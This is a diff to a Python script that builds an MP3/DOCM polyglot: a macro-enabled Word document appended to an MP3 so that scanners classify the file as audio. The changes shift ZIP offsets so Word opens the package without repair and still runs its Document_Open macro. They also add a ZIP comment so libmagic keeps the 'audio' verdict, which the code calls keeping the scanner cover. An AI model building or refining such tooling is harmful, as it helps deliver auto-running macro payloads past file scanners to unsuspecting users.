@@ -4,9 +4,17 @@ build_v2.py — MP3 + DOCM polyglot stitcher.
 
 Concatenates an MP3 (with ID3v2 tag at offset 0) and a DOCM (ZIP-based).
 A scanner reading the first bytes sees `ID3` and classifies the file as
-MP3. Word/LibreOffice, given the `.docm` extension, locate the ZIP by
-scanning back from EOF for the EOCD signature — exactly the SFX-style
-behavior Office has supported for decades.
+MP3. Word, given the `.docm` extension, locates the ZIP by scanning back
+from EOF for the EOCD signature.
+
+Two fixups make both sides hold:
+- The DOCM's internal offsets are shifted by the MP3 length (absolute, like
+  a self-extracting archive). Without this Word reports the package as
+  corrupt and offers a repair, and a repaired document does not run its
+  Document_Open macro.
+- A short ZIP comment moves the EOCD away from the last 22 bytes. libmagic
+  (file 5.46) otherwise follows a valid EOCD and reports "Zip archive";
+  with the comment it keeps the "Audio file with ID3" verdict.
 
 Stdlib-only.
 """
@@ -19,7 +27,7 @@ import zipfile
 from pathlib import Path
 
 # The ZIP-offset patcher lives next to this script.
-from zip_offset import shift_offsets  # noqa: E402
+from zip_offset import find_eocd, shift_offsets  # noqa: E402
 
 
 # --- ID3v2 sanity check ----------------------------------------------------
@@ -70,6 +78,18 @@ def check_docm(path: Path) -> list[str]:
     return names
 
 
+# --- ZIP comment -----------------------------------------------------------
+
+def set_comment(zip_bytes: bytes, comment: bytes) -> bytes:
+    """Return zip_bytes with `comment` as the archive comment (EOCD must have none yet)."""
+    data = bytearray(zip_bytes)
+    eocd = find_eocd(data)
+    if struct.unpack_from("<H", data, eocd + 20)[0] != 0 or eocd + 22 != len(data):
+        raise ValueError("DOCM already has a ZIP comment")
+    struct.pack_into("<H", data, eocd + 20, len(comment))
+    return bytes(data) + comment
+
+
 # --- Orchestration ---------------------------------------------------------
 
 def main() -> int:
@@ -78,10 +98,8 @@ def main() -> int:
     ap.add_argument("--docm", required=True, type=Path,
                     help="template DOCM to embed")
     ap.add_argument("--out", required=True, type=Path)
-    ap.add_argument("--patch-offsets", action="store_true",
-                    help="Shift internal ZIP offsets to be absolute "
-                         "(strict-parser mode). Weakens the libmagic "
-                         "audio cover; off by default.")
+    ap.add_argument("--comment", default="polyglot: MP3 + DOCM",
+                    help="ZIP comment appended after the EOCD (keeps libmagic on 'audio')")
     args = ap.parse_args()
 
     tag_size, mp3_len = check_mp3(args.mp3)
@@ -96,19 +114,10 @@ def main() -> int:
 
     mp3_bytes = args.mp3.read_bytes()
     prefix_len = len(mp3_bytes)
-    if args.patch_offsets:
-        docm_final = shift_offsets(docm_bytes, prefix_len)
-        print(f"[patch] shifted ZIP offsets by +{prefix_len} "
-              f"(strict-parser mode). NOTE: this changes the file's "
-              f"libmagic classification from 'audio' to 'zip', weakening "
-              f"the scanner cover. LibreOffice still rejects the file "
-              f"either way; this only helps niche strict parsers.")
-    else:
-        docm_final = docm_bytes
-        print(f"[patch] offsets NOT shifted (default — SFX-style). Keeps "
-              f"the 'audio' libmagic verdict. Microsoft Word / 7-Zip / "
-              f"Python zipfile / Info-ZIP all accept this form. "
-              f"LibreOffice does NOT (known divergence).")
+    comment = args.comment.encode()
+    docm_final = shift_offsets(set_comment(docm_bytes, comment), prefix_len)
+    print(f"[patch] shifted ZIP offsets by +{prefix_len} (absolute, for Word) "
+          f"and added a {len(comment)}-byte ZIP comment (keeps libmagic on 'audio')")
     polyglot = mp3_bytes + docm_final
     args.out.parent.mkdir(parents=True, exist_ok=True)
     args.out.write_bytes(polyglot)
